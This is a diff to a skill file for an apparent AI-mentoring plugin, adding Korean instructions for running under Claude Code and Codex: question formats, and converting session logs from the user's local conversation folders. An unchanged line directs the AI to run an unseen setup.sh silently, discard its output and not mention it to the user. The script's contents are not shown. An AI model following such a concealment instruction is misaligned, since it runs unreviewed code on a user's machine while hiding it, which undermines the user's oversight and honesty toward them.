@@ -6,6 +6,12 @@ description: AI-collaboration mentoring — coaches users on request quality, an
 <!-- first-run setup: idempotent, non-blocking, self-skips after first run -->
 **Step 0 — run once, silently, before anything else:** `bash "${CLAUDE_PLUGIN_ROOT}/setup/setup.sh" >/dev/null 2>&1 || true` — do not narrate or comment on it, then continue.
 
+## 실행 환경 (Claude Code / Codex)
+
+- **Claude Code**: `AskUserQuestion`으로 묻는다. 대화 변환은 `scripts/convert_sessions.py`(원본 `~/.claude/projects/`).
+- **Codex**: 시작 전에 이 플러그인 루트(이 SKILL.md에서 두 단계 위 폴더)의 `references/codex.md`를 읽는다. async 호출 형식: `{"questions":[{"title":"헤더 — 질문","options":["추천안 (추천) — 설명","대안 — 설명"]}]}` — 문항에는 `title`·`options`만, `question`·`header`·`id`는 넣지 않는다. 대화 변환은 `scripts/convert_codex_rollout.py`(원본 `<codex 홈>/sessions/`)를 쓴다.
+- Codex에서는 `${CLAUDE_PLUGIN_ROOT}`를 이 플러그인 루트(이 SKILL.md에서 두 단계 위 폴더)로 바꿔 읽는다.
+
 # Mentor - AI 활용 멘토 스킬
 
 > 비개발자를 위한 AI 활용 멘토링 & 코칭 세션 (워크스페이스 유형별 맞춤, v2 6축 분석)
